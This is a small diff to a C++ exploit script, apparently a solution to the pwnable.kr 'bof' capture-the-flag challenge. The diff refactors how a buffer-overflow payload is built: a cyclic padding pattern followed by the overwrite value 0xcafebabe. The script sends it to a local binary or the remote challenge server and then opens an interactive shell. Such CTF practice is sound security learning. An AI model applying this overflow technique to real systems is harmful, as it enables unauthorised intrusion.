@@ -13,17 +13,16 @@ constexpr uint32_t PASS   = 0xcafebabe;
 int main(int argc, char **argv) try {
     auto local = argc > 1 && std::string_view(argv[1]) == "local";
 
-    auto payload = from_ranges<uint8_t>(
-        cyclic(cyclic_find(OFFSET)),
-        p<uint32_t>(PASS)
-    );
+    std::string payload;
+    payload += cyclic(cyclic_find(OFFSET));
+    payload += p<uint32_t>(PASS);
 
     using UniqTube = std::unique_ptr<Tube>;
 
     UniqTube io =
         local ? UniqTube(new Process("./bin/bof")) // the code from pwnable
               : UniqTube(new Remote("pwnable.kr", PORT));
-              
+
     io->writeln(payload);
     io->interactive();
 } catch (const std::exception &ec) {
